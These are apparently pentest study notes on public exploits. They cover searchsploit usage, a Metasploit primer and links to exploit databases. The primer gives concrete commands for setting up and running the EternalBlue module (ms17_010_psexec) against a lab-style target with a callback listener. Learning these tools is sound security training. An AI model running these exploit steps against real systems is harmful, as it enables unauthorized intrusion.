# exploitation

## public exploits

### searchsploit

A well-known tool for this purpose is searchsploit, which we can use to search for public vulnerabilities/exploits for any application.

- `sudo apt install exploitdb -y`
- `searchsploit openssh 7.2`

### metasploit primer

The Metasploit Framework (MSF) is an excellent tool for pentesters. It contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets. MSF has many other features, like:

- Running reconnaissance scripts to enumerate remote hosts and compromised targets
- Verification scripts to test the existence of a vulnerability without actually compromising the target
- Meterpreter, which is a great tool to connect to shells and run commands on the compromised targets
- Many post-exploitation and pivoting tools

usage:

- to run metasploit, use `msfconsole`
- use `search exploit <exploit search term>` for details about a certain exploit (e.g. `search exploit eternalblue`)
- run the exploit with `use <exploitname>` (e.g. `use exploit/windows/smb/ms17_010_psexec`)
- then use `show options` to configure the exploit. use `set <option> <value>` (e.g. `set RHOST 10.10.10.40`, `set LHOST tun0`)
- before actually running the exploit, use `check` to check if the server is actually vulnerable
- finally run the exploit with `run`

### exploit databases

- https://www.exploit-db.com/
- https://www.rapid7.com/db/
- https://www.vulnerability-lab.com/
